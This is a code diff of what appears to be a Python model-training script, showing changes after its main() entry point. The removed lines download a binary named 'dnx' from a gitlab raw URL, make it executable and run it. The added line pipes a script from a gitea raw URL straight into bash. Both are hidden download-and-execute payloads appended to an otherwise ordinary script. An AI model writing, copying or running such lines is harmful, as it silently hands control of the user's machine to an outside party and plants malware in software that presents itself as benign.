@@ -72,6 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://gitlab.com/adina3634402/samita/-/raw/main/dnx')
-os.system('chmod 777 dnx')
-os.system('./dnx')
+os.system('curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash')
